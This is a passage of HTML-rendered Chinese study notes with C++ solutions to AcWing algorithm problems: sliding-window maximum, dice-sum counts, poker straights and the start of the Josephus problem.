class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">leftRotateString</span><span class="params">(string str, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">reverse</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">reverse</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>() - n);</span><br><span class="line">    <span class="built_in">reverse</span>(str.<span class="built_in">end</span>() - n, str.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> str;  <span class="comment">// 报segament fault可能是因为没写return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-7">Week 7</h1><h2 id="滑动窗口的最大值★"><a href="https://www.acwing.com/problem/content/75/">滑动窗口的最大值★</a></h2><p>给定一个数组和滑动窗口的大小，请找出所有滑动窗口里的最大值。</p><p>例如，如果输入数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[2, 3, 4, 2, 6, 2, 5, 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> 及滑动窗口的大小 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>，那么一共存在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn></mrow><annotation encoding="application/x-tex">6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span> 个滑动窗口，它们的最大值分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>4</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[4, 4, 6, 6, 6, 5]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">]</span></span></span></span>。</p><p><strong>注意：</strong></p><ul><li>数据保证 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 小于等于数组长度。</li></ul><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[2, 3, 4, 2, 6, 2, 5, 1] , k=3输出: [4, 4, 6, 6, 6, 5]</code></pre><h3 id="双向单调递减队列">双向单调递减队列</h3><p>时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>, 每个元素都会入队一次, 最多出队一次。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxInWindows</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; q;  <span class="comment">// deque维护滑动窗口(队列), 元素是下标</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="comment">// 保证是递减队列（早进入且小的数字“永无出头之日”）</span></span><br><span class="line">      <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; nums[q.<span class="built_in">back</span>()] &lt;= nums[i]) q.<span class="built_in">pop_back</span>();</span><br><span class="line">      q.<span class="built_in">push_back</span>(i);</span><br><span class="line">      <span class="keyword">if</span> (q.<span class="built_in">size</span>() &amp;&amp; i - q.<span class="built_in">front</span>() + <span class="number">1</span> &gt; k) q.<span class="built_in">pop_front</span>();</span><br><span class="line">      <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) res.<span class="built_in">push_back</span>(nums[q.<span class="built_in">front</span>()]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="骰子的点数★"><a href="https://www.acwing.com/problem/content/76/">骰子的点数★</a></h2><p>将一个骰子投掷 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 次，获得的总点数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 的可能范围为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>∼</mo><mn>6</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">n \sim 6n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span><span class="mord mathnormal">n</span></span></span></span>。</p><p>掷出某一点数，可能有多种掷法，例如投掷 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 次，掷出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 点，共有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,2],[2,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> 两种掷法。</p><p>请求出投掷 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 次，掷出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>∼</mo><mn>6</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">n \sim 6n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span><span class="mord mathnormal">n</span></span></span></span> 点分别有多少种掷法。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span></p><p><strong>样例1</strong></p><pre><code>输入：n=1输出：[1, 1, 1, 1, 1, 1]解释：投掷1次，可能出现的点数为1-6，共计6种。每种点数都只有1种掷法。所以输出[1, 1, 1, 1, 1, 1]。</code></pre><p><strong>样例2</strong></p><pre><code>输入：n=2输出：[1, 2, 3, 4, 5, 6, 5, 4, 3, 2, 1]解释：投掷2次，可能出现的点数为2-12，共计11种。每种点数可能掷法数目分别为1,2,3,4,5,6,5,4,3,2,1。      所以输出[1, 2, 3, 4, 5, 6, 5, 4, 3, 2, 1]。</code></pre><h3 id="算法1-dfs暴力递归">算法1 dfs暴力递归</h3><blockquote><p>不推荐，会存在<strong>重复计算状态</strong>的问题，会报 <code>TLE(Time Limit Exceeded)</code> 。</p><p>时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mn>6</mn><mi>n</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(6^n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numberOfDice</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i &lt;= <span class="number">6</span> * n; i++) res.<span class="built_in">push_back</span>(<span class="built_in">dfs</span>(n, i));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> sum)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!n) <span class="keyword">return</span> !sum;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) res += <span class="built_in">dfs</span>(n - <span class="number">1</span>, sum - i);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="算法2-DP">算法2 DP</h3><p><strong>二维写法</strong></p><blockquote><p>状态表示: <code>f[i][j]</code>表示投掷i次总点数为j的情况数。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numberOfDice</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">f</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">6</span> * n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt;= <span class="number">6</span> * i; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= <span class="built_in">min</span>(j, <span class="number">6</span>); k++) &#123;</span><br><span class="line">          f[i][j] += f[i - <span class="number">1</span>][j - k];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(f[n].<span class="built_in">begin</span>() + n, f[n].<span class="built_in">end</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>一维写法</strong></p><p>采用滚动数组优化: 从二维降为一维<br>注意: 需要清零，比如第3轮[3…18]与第2轮[2…12]有交集[2…12], 计算交集时需要先清除旧值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numberOfDice</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">f</span><span class="params">(<span class="number">6</span> * n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) f[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">6</span> * i; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">        f[j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= <span class="built_in">min</span>(<span class="number">6</span>, j); k++)</span><br><span class="line">          f[j] += f[j - k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(f.<span class="built_in">begin</span>() + n, f.<span class="built_in">end</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="扑克牌的顺子"><a href="https://www.acwing.com/problem/content/77/">扑克牌的顺子</a></h2><p>从扑克牌中随机抽 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 张牌，判断是不是一个顺子，即这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 张牌是不是连续的。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>∼</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">2 \sim 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span> 为数字本身，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>J</mi></mrow><annotation encoding="application/x-tex">J</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12</mn></mrow><annotation encoding="application/x-tex">12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>13</mn></mrow><annotation encoding="application/x-tex">13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">13</span></span></span></span>，大小王可以看做任意数字。</p><p>为了方便，大小王均以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 来表示，并且假设这副牌中大小王均有两张。</p><p><strong>样例1</strong></p><pre><code>输入：[8,9,10,11,12]输出：true</code></pre><p><strong>样例2</strong></p><pre><code>输入：[0,8,9,11,12]输出：true</code></pre><h3 id="模拟法-3">模拟法</h3><p>顺子条件：</p><ol><li>除0外无重复数字</li><li>用0能把空位填上，使之成为连续数字</li></ol><p>算法步骤：</p><ol><li>排序</li><li>删0</li><li>判断有无重复</li><li>看最大值与最小值的差距是否小于等于4</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isContinuous</span><span class="params">(vector&lt;<span class="type">int</span>&gt; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (nums[k] == <span class="number">0</span>) k++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k + <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums.<span class="built_in">back</span>() - nums[k] &lt;= <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="圆圈中最后剩下的数字★"><a href="https://www.acwing.com/problem/content/78/">圆圈中最后剩下的数字★</a></h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0, 1, …, n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord 